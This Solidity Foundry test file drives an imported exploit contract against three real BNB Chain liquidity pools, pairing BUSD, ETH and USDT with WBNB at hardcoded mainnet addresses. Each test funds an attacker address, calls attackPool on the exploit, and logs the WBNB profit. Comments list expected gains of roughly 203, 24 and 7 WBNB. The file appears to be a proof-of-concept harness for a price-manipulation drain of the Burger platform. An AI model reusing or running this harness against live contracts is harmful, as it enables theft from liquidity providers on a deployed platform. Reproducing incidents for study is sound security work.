// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerMultiExploit.sol";

contract BurgerMultiTest is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant ETH_TOKEN = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    BurgerMultiExploit exploit;
    address attacker;

    // Test BUSD/WBNB pool (203 WBNB)
    function test_busdPool() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1000 ether);
        vm.startPrank(attacker);

        exploit = new BurgerMultiExploit();
        IWBNB(WBNB).deposit{value: 500 ether}();
        IWBNB(WBNB).transfer(address(exploit), 500 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB before", wbnbBefore);

        // Buy BUSD with 300 WBNB, use 15% for pair
        exploit.attackPool(BUSD, 300 ether, 15);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB after", wbnbAfter);
        emit log_named_int("WBNB delta", int256(wbnbAfter) - int256(wbnbBefore));

        vm.stopPrank();
    }

    // Test ETH/WBNB pool (24 WBNB)
    function test_ethPool() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        vm.startPrank(attacker);

        exploit = new BurgerMultiExploit();
        IWBNB(WBNB).deposit{value: 50 ether}();
        IWBNB(WBNB).transfer(address(exploit), 50 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));

        // Buy ETH with 30 WBNB
        exploit.attackPool(ETH_TOKEN, 30 ether, 15);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_int("ETH pool profit", int256(wbnbAfter) - int256(wbnbBefore));

        vm.stopPrank();
    }

    // Test USDT/WBNB pool (7 WBNB)
    function test_usdtPool() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 50 ether);
        vm.startPrank(attacker);

        exploit = new BurgerMultiExploit();
        IWBNB(WBNB).deposit{value: 20 ether}();
        IWBNB(WBNB).transfer(address(exploit), 20 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));

        exploit.attackPool(USDT, 10 ether, 15);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_int("USDT pool profit", int256(wbnbAfter) - int256(wbnbBefore));

        vm.stopPrank();
    }
}
